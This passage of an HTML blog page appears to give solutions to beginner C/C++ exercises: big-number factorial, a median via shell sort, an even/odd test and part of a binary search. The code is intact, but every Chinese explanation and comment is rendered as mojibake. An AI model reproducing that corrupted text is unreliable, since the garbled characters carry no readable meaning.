class="line">    M = -N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( M!=<span class="number">0</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( D == M%<span class="number">10</span> ) <span class="comment">// M é™¤ä»¥10çš„ä½™æ•°ï¼ˆæ±‚å½“å‰ä¸ªä½çš„æ•°å­—ï¼‰</span></span><br><span class="line">    cnt++;</span><br><span class="line">    M/=<span class="number">10</span>; <span class="comment">// M å‡å°‘æœ€åä¸€ä½</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-10-é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ-20åˆ†"><a href="#6-10-é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ-20åˆ†" class="headerlink" title="6-10 é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ (20åˆ†)"></a>6-10 é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ (20åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªæ‰“å°éè´Ÿæ•´æ•°é˜¶ä¹˜çš„å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ï¼Œå…¶å€¼ä¸è¶…è¿‡ <code>1000</code>ã€‚å¦‚æœ <code>N</code> æ˜¯éè´Ÿæ•´æ•°ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»åœ¨ä¸€è¡Œä¸­æ‰“å°å‡º <code>N!</code> çš„å€¼ï¼Œå¦åˆ™æ‰“å°â€œInvalid inputâ€</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-9"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-9" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    Print_Factorial(N);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">15</span><br><span class="line">è¾“å‡º</span><br><span class="line">1307674368000</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-8"><a href="#è§£ç­”-8" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>æ˜“é”™ç‚¹æœ‰2ä¸ª</p><ol><li>å½“Nè¿‡å¤§æ—¶ï¼Œ<code>long int</code> ä¹Ÿæ— æ³•æ»¡è¶³è§£çš„è¦æ±‚</li><li>ç”¨æ•°ç»„å­˜æ”¾ç»“æœæ—¶ï¼Œè¦æ³¨æ„ <code>è¿›ä½</code> åœ¨è¿›è¡Œæœ€é«˜ä½è®¡ç®—å®Œæ¯•åï¼Œè¿›ä½å¯èƒ½æ˜¯å¤šä½æ•°ï¼›ç»“æœåœ¨æ•°ç»„ä¸­å­˜æ”¾çš„æ˜¯0~k-1ä½ä¸”é«˜ä½åœ¨åï¼Œä½ä½åœ¨å‰</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid input"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(N&lt;=<span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">                sum *= i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%ld"</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (N &gt; <span class="number">12</span> &amp;&amp; N &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum[<span class="number">3000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">/* ç¡®ä¿ä¿å­˜æœ€ç»ˆè¿ç®—ç»“æœçš„æ•°ç»„è¶³å¤Ÿå¤§ï¼š</span></span><br><span class="line"><span class="comment">        1-9ç›¸ä¹˜æœ€å¤šæœ‰9ä½ï¼Œ10-99ç›¸ä¹˜æœ€å¤šæœ‰2*90=180ä½</span></span><br><span class="line"><span class="comment">        100-999ç›¸ä¹˜æœ€å¤šæœ‰3*900=2700ä½ï¼Œ1000æ˜¯4*1=4ä½</span></span><br><span class="line"><span class="comment">        æ€»è®¡2893ä½ */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> temp, i, j;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">1</span>;  <span class="comment">// ä½æ•°</span></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;  <span class="comment">// è¿›ä½</span></span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">1</span>;   <span class="comment">//å°†ç»“æœå…ˆåˆå§‹åŒ–ä¸º1</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=N;i++) &#123; <span class="comment">//å¼€å§‹é˜¶ä¹˜ï¼Œé˜¶ä¹˜å…ƒç´ ä»2å¼€å§‹</span></span><br><span class="line">        <span class="comment">//å’Œå¹³æ—¶ä¹˜æ³•æ–¹æ³•ç›¸åŒï¼Œå°†ä¸´æ—¶ç»“æœçš„æ¯ä½ä¸é˜¶ä¹˜å…ƒç´ ç›¸ä¹˜</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;k;j++) &#123;</span><br><span class="line">                </span><br><span class="line">                temp = sum[j]*i + n;</span><br><span class="line">                <span class="comment">//ç›¸åº”é˜¶ä¹˜ä¸­çš„ä¸€é¡¹ä¸å½“å‰æ‰€å¾—ä¸´æ—¶ç»“æœçš„æŸä½ç›¸ä¹˜ï¼ˆåŠ ä¸Šè¿›ä½ï¼‰</span></span><br><span class="line">                </span><br><span class="line">                sum[j] = temp%<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//æ›´æ–°ä¸´æ—¶ç»“æœçš„ä½ä¸Šä¿¡æ¯</span></span><br><span class="line">                </span><br><span class="line">                n = temp/<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//çœ‹æ˜¯å¦æœ‰è¿›ä½</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(n!=<span class="number">0</span> &amp;&amp; j==k<span class="number">-1</span>)&#123; <span class="comment">//å¦‚æœæœ‰è¿›ä½</span></span><br><span class="line">                    k++;   <span class="comment">//å¤„ç†æœ€åè¿›ä½ä¸ºä¸¤ä½</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,sum[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å› ä¸ºlongæ•°æ®ç±»å‹è¡¨ç¤ºçš„æ•°å­—èŒƒå›´åˆ° <code>2147483647</code><br>è€Œ<code>12!</code>æ­£å¥½æ˜¯9ä½æ•°ï¼Œæ‰€ä»¥ä»12ä¸ºåˆ†ç•Œç‚¹</p><p>é‡‡ç”¨æ•°ç»„æ–¹æ³•å­˜å‚¨ï¼Œè®¾ç½®è¿›ä½ã€ä½æ•°ã€ä¸´æ—¶å€¼ã€‚</p><p>ä¸´æ—¶å€¼ä¸€å®šè¦æ¯ä¸€ä½éƒ½ä¸ç¬¬iä¸ªå…ƒç´ ç›¸ä¹˜ã€‚</p><hr><h2 id="6-11-æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•°-25åˆ†"><a href="#6-11-æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•°-25åˆ†" class="headerlink" title="6-11 æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•° (25åˆ†)"></a>6-11 æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•° (25åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ <code>N</code> ä¸ªé›†åˆå…ƒç´  <code>A[]</code> çš„ä¸­ä½æ•°ï¼Œå³åºåˆ—ä¸­ç¬¬<code>âŒŠ(N+1)/2âŒ‹</code>å¤§çš„å…ƒç´ ã€‚å…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨æ•°ç»„<code>A[]</code>ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ªA[]å…ƒç´ çš„ä¸­ä½æ•°ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯ <code>ElementType</code>ç±»å‹ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-10"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-10" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType A[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;A[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Median(A, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">12.30</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-9"><a href="#è§£ç­”-9" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    ElementType temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> gap=N/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap=gap/<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">//gapæ˜¯æ¯æ¬¡æ’åºåˆ†ç»„çš„é—´éš”ï¼Œæ¯æ¬¡é—´éš”ç¼©å°1/2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=gap; i&lt;N; i++) &#123;</span><br><span class="line">    <span class="comment">//ç›¸å½“äºåœ¨åŒä¸€ç»„å†…é‡‡ç”¨ç›´æ¥æ’å…¥æ’åº</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i-gap; j&gt;=<span class="number">0</span> &amp;&amp; A[j]&gt;A[j+gap]; j=j-gap) &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœåŒä¸€ç»„å†…å‰ä¸€ä¸ªå…ƒç´ å¤§äºç›¸éš”gapä¸ªä½ç½®çš„å…ƒç´ ï¼Œåˆ™ä¸¤è€…äº¤æ¢ä½ç½® </span></span><br><span class="line">                temp = A[j];</span><br><span class="line">                A[j] = A[j+gap];</span><br><span class="line">                A[j+gap] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[N/<span class="number">2</span>]; <span class="comment">// è¿”å›ä¸­é—´å…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">input:</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">5 2 1 3 6</span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">i=2, gap=2, j=0</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 1.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">i=3, gap=1, j=2</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 3.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">3.00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="6-12-åˆ¤æ–­å¥‡å¶æ€§-10åˆ†"><a href="#6-12-åˆ¤æ–­å¥‡å¶æ€§-10åˆ†" class="headerlink" title="6-12 åˆ¤æ–­å¥‡å¶æ€§ (10åˆ†)"></a>6-12 åˆ¤æ–­å¥‡å¶æ€§ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°åˆ¤æ–­ç»™å®šæ•´æ•°å¥‡å¶æ€§çš„å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>n</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„æ•´å‹å‚æ•°ã€‚å½“ <code>nä¸ºå¶æ•°</code> æ—¶ï¼Œå‡½æ•°è¿”å›1ï¼›<code>nä¸ºå¥‡æ•°</code> æ—¶è¿”å›0ã€‚æ³¨æ„ï¼š0æ˜¯å¶æ•°ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-11"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-11" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> (even(n))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is even.\n"</span>, n);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is odd.\n"</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">-6</span><br><span class="line">5</span><br><span class="line">è¾“å‡º</span><br><span class="line">-6 is even.</span><br><span class="line">5 is odd.</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-10"><a href="#è§£ç­”-10" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(n%<span class="number">2</span>);</span><br><span class="line">    <span class="comment">/* Né™¤2å–ä½™æ•°ï¼Œå°†ä½™æ•°å€¼çš„éè¿”å›å³æˆç«‹</span></span><br><span class="line"><span class="comment">        3%2 = 1</span></span><br><span class="line"><span class="comment">        6%2 = 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-13-æŠ˜åŠæŸ¥æ‰¾-15åˆ†"><a href="#6-13-æŠ˜åŠæŸ¥æ‰¾-15åˆ†" class="headerlink" title="6-13 æŠ˜åŠæŸ¥æ‰¾ (15åˆ†)"></a>6-13 æŠ˜åŠæŸ¥æ‰¾ (15åˆ†)</h2><p>ç»™ä¸€ä¸ªä¸¥æ ¼é€’å¢æ•°åˆ—ï¼Œå‡½æ•° <code>int Search_Bin(SSTable T, KeyType k)</code> ç”¨æ¥äºŒåˆ†åœ°æŸ¥æ‰¾kåœ¨æ•°åˆ—ä¸­çš„ä½ç½®ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span></span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­Tæ˜¯æœ‰åºè¡¨ï¼Œkæ˜¯æŸ¥æ‰¾çš„å€¼ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-12"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-12" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> KeyType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>                     </span></span><br><span class="line"><span class="class">&#123;</span> KeyType  key;                                             </span><br><span class="line">&#125; ElemType;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> ElemType  *R; </span><br><span class="line">  <span class="keyword">int</span>  length;</span><br><span class="line">&#125; SSTable;                      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">Create</span><span class="params">(SSTable &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> i;</span><br><span class="line">  T.R=<span class="keyword">new</span> ElemType[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">cin</span>&gt;&gt;T.length;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=T.length;i++)</span><br><span class="line">     <span class="built_in">cin</span>&gt;&gt;T.R[i].key;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> 